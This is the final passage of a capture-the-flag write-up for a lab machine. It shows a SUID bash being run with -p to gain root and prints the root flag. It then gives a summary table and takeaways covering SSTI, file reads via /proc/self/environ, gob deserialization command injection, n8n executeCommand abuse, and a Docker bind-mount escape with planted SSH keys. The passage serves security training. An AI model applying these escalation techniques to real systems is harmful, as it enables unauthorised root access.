**Verify the SUID bash:**

```bash
kpark@takeoff:~$ ls -la bash
-rwsr-xr-x 1 root root 1298416 Nov 23 09:57 bash
```

The `s` in `-rwsr-xr-x` confirms the SUID bit is set, and the owner is `root`.

**Execute with `-p` to preserve effective UID:**

```bash
kpark@takeoff:~$ ./bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
bash-5.2# cat /root/root.txt
436c9651f6d263e85047621b097ee4da
```

The `-p` flag tells bash not to drop privileges — without it, bash would reset the effective UID back to the real UID (kpark). With `-p`, the effective UID stays as root (from the SUID bit).

**Root flag: `43******da`**

---

## Summary

| Step | Technique | Access Gained |
|------|-----------|---------------|
| 1 | Enumeration — nmap, dirsearch, web app exploration | Service map, registered user account |
| 2 | SSTI in Go `text/template` via ticket notes → `.File` method | Arbitrary file read as www-data |
| 3 | LFI on `/proc/self/environ` | HMAC key + n8n API key |
| 4 | Binary analysis — UPX unpack, strings | Understanding of gob check-in format |
| 5 | Gob deserialization + HMAC signing → NotifyCmd injection | RCE as www-data (host) |
| 6 | n8n API → `executeCommand` workflow node | RCE as root (Docker container) |
| 7 | Read `/root/user.txt` from container | **User flag** |
| 8 | Docker bind-mount abuse (`/root` = `/home/kpark`) + SUID bash + SSH key | **Root** |

## Key Takeaways

- **ProtectHome=true** prevented direct access to `/home` from the www-data shell. The Docker bind mount (`/home/kpark` → container `/root`) provided a bypass path — we could write to kpark's home directory through the container even though the www-data process couldn't see `/home` at all.

- **CAP_MKNOD was available but CAP_SYS_ADMIN was not.** We successfully created a block device node for `/dev/sda4` in the container, but couldn't mount the host filesystem. Instead, we transferred the host's bash binary via an HTTP server bridging the two network namespaces.

- **The SUID bash had to be the host's binary** (glibc/Debian), not the container's (musl/Alpine). Running an Alpine binary on a Debian host would fail with "not found" (the dynamic linker path differs between musl and glibc).

- **SSH ownership matters.** Even though we're root in the container and can create files anywhere in `/root`, SSH strictly requires that `.ssh/authorized_keys` is owned by the target user (kpark, uid 1001). We had to `chown 1001:1001` after writing the key.

- **The n8n Code node is sandboxed** — `process`, `require('child_process')`, and `require('fs')` are all blocked. The `executeCommand` node bypasses this entirely by running commands directly via the host shell inside the container.
